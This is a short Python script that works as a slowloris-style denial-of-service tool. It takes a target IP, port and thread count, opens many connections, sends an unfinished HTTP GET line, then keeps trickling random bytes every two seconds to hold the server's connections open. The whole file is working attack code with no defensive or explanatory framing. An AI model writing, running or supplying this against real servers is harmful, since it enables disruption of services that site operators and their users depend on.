import socket
import threading
import sys
import time
import errno
import random

ip = sys.argv[1]
port = int(sys.argv[2])
NO_THREAD = int(sys.argv[3])
BUFF = 8

def recv_dump(sck):
    res = sck.recv(BUFF)
    while res != b'':
        res = sck.recv(BUFF)
    
def worker(name):
    try:
        i = 0
        sck = socket.socket()
        sck.connect((ip,port))
        sck.setblocking(0)
        print("connetion successfull",name)
        sck.send(b'GET / HTTP/1.1 ')
        while True:
            try:
                sck.send(b'%d'%random.randint(0,10000))
                i+=1
                print("send request {} for {}".format(i,name))
            except Exception as e:
                if e.args[0]==32:
                    print("Reconnecting for : ",name)
                    #sck.connect((ip,port))
                else:
                    print("------>",e,"\nclosing Thread :",name)
                    sys.exit()
            time.sleep(2)
    except Exception as e:
        print("socket failed for",name)
        print("erroe",e)

dict = {}
for i in range(NO_THREAD):
    dict['t{}'.format(i)] = threading.Thread(target=worker,args=('t{}'.format(i),))
    dict['t{}'.format(i)].start()
    
